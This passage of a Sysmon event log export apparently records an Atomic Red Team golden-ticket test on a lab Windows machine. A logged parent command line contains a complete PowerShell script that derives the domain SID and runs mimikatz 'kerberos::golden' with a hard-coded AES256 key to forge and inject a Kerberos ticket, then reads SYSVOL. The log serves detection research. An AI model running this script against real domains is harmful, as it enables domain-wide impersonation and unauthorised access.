CommandLine: ""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\golden.bat

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=AB7024BDCBC308CE40ADE31373D2719A,SHA256=2E889BA98EB18739E33BB28412F2D4E847BB2B56CBD74D0A4488FF5F9C756BDE,IMPHASH=E9DF230F3CED78C5C775014DECE4BA58

ParentProcessGuid: {fda94052-43a7-658d-6a02-000000000b00}

ParentProcessId: 5508

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = \""""S-1-5-21-DEFAULT\""""
If ($domain_sid -Match \""""DEFAULT\"""") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
&gt;%TEMP%\golden.txt 2&gt;&amp;1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe \""""kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:goldenticketfakeuser /ptt\"""" \""""exit\""""

  echo.
  echo Requesting SYSVOL:
  dir \\%userdnsdomain%\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
\""""@ -Replace \""""DOMAIN_SID\"""", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\golden.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\golden.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:45:13.187,,,,,,,,,11,9464,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:45:13.187

ProcessGuid: {fda94052-43a7-658d-6a02-000000000b00}

ProcessId: 5508

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\golden.bat

CreationUtcTime: 2023-12-28 09:45:13.187

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-43a7-658d-6a02-000000000b00},7044,5508,,,,,,"
      ",-,,,,,,2023-12-28T09:45:13.1992088Z,C:\Users\User\AppData\Local\Temp\golden.bat,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:45:13.187,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:45:13.1992088Z""/>
      <EventRecordID>9464</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:45:13.187</Data>
      <Data Name=""ProcessGuid"">{fda94052-43a7-658d-6a02-000000000b00}</Data>
      <Data Name=""ProcessId"">5508</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\golden.bat</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:45:13.187</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:45:13.187

ProcessGuid: {fda94052-43a7-658d-6a02-000000000b00}

ProcessId: 5508

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\golden.bat

CreationUtcTime: 2023-12-28 09:45:13.187

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:45:11.381,,,,,,,,,11,9463,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:45:11.381

ProcessGuid: {fda94052-43a7-658d-6a02-000000000b00}

ProcessId: 5508

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_ww1m4mpx.nqe.ps1

CreationUtcTime: 2023-12-28 09:45:11.381

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-43a7-658d-6a02-000000000b00},7044,5508,,,,,,"
      ",-,,,,,,2023-12-28T09:45:11.3968228Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_ww1m4mpx.nqe.ps1,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:45:11.381,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:45:11.3968228Z""/>
      <EventRecordID>9463</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:45:11.381</Data>
      <Data Name=""ProcessGuid"">{fda94052-43a7-658d-6a02-000000000b00}</Data>
      <Data Name=""ProcessId"">5508</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_ww1m4mpx.nqe.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:45:11.381</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:45:11.381

ProcessGuid: {fda94052-43a7-658d-6a02-000000000b00}

ProcessId: 5508

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_ww1m4mpx.nqe.ps1

CreationUtcTime: 2023-12-28 09:45:11.381

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
